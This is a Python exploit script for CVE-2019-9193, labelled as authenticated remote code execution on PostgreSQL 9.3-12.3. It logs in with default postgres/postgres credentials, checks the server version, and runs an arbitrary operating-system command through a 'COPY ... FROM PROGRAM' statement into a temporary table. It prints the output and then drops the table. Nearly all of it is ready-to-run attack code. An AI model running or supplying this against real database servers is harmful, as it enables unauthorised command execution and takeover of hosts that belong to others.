# Version: 9.3 - 12.3
## CVE: CVE-2019–9193
# 
#!/usr/bin/python3 

import psycopg2
import argparse
import hashlib
import time

def parseArgs():
    parser = argparse.ArgumentParser(description='CVE-2019–9193 - PostgreSQL 9.3-12.3 Authenticated Remote Code Execution')
    parser.add_argument('-i', '--ip', nargs='?', type=str, default='127.0.0.1', help='The IP address of the PostgreSQL DB [Default: 127.0.0.1]')
    parser.add_argument('-p', '--port', nargs='?', type=int, default=5432, help='The port of the PostgreSQL DB [Default: 5432]')
    parser.add_argument('-d', '--database', nargs='?', default='template1', help='Name of the PostgreSQL DB [Default: template1]')
    parser.add_argument('-c', '--command', nargs='?', help='System command to run')
    parser.add_argument('-t', '--timeout', nargs='?', type=int, default=10, help='Connection timeout in seconds [Default: 10 (seconds)]')
    parser.add_argument('-U', '--user', nargs='?', default='postgres', help='Username to use to connect to the PostgreSQL DB [Default: postgres]')
    parser.add_argument('-P', '--password', nargs='?', default='postgres', help='Password to use to connect to the the PostgreSQL DB [Default: postgres]')
    args = parser.parse_args()
    return args

def main():
    try:
        print ("\r\n[+] Connecting to PostgreSQL Database on {0}:{1}".format(args.ip, args.port))
        connection = psycopg2.connect (
            database=args.database, 
            user=args.user, 
            password=args.password, 
            host=args.ip, 
            port=args.port, 
            connect_timeout=args.timeout
        )
        print ("[+] Connection to Database established")
        
        print ("[+] Checking PostgreSQL version")
        checkVersion(connection)

        if(args.command):
            exploit(connection)
        else:
            print ("[+] Add the argument -c [COMMAND] to execute a system command")

    except psycopg2.OperationalError as e:
        print ("\r\n[-] Connection to Database failed: \r\n{0}".format(e))
        exit()

def checkVersion(connection):
    try:
        cursor = connection.cursor()
        cursor.execute("SELECT version()")
        record = cursor.fetchall()
        cursor.close()

        result = deserialize(record)
        version_str = result.split()[1]  # Lấy phiên bản từ chuỗi
        version = float(version_str)

        if version >= 9.3:
            print("[+] PostgreSQL {0} is likely vulnerable".format(version))
        else:
            print("[-] PostgreSQL {0} may not be vulnerable".format(version))

    except (ValueError, IndexError):
        print("[-] Unable to parse version number.")
    except Exception as e:
        print("[-] An error occurred while checking version: {0}".format(str(e)))
def deserialize(record):
    result = ""
    for rec in record:
        result += rec[0]+"\r\n"
    return result

def randomizeTableName():
    return ("_" + hashlib.md5(time.ctime().encode('utf-8')).hexdigest())

def exploit(connection):
    tableName = randomizeTableName()

    try:
        with connection.cursor() as cursor:
            print("[+] Creating table {0}".format(tableName))
            cursor.execute(f"""
                DROP TABLE IF EXISTS {tableName};
                CREATE TABLE {tableName}(cmd_output text);
                COPY {tableName} FROM PROGRAM '{args.command}';
                SELECT * FROM {tableName};
            """)

            print("[+] Command executed\r\n")

            record = cursor.fetchall()
            if record:
                result = deserialize(record)
                print(result)
            else:
                print("[-] No output returned from the command.")

            print("[+] Deleting table {0}\r\n".format(tableName))
            cursor.execute(f"DROP TABLE {tableName};")

    except psycopg2.errors.ExternalRoutineException as e:
        print("[-] Command failed: {0}".format(e.pgerror))
        print("[+] Deleting table {0}\r\n".format(tableName))
        with connection.cursor() as cursor:
            cursor.execute(f"DROP TABLE IF EXISTS {tableName};")

    except Exception as e:
        print("[-] An unexpected error occurred: {0}".format(str(e)))

if __name__ == "__main__":
    args = parseArgs()
    main()
            
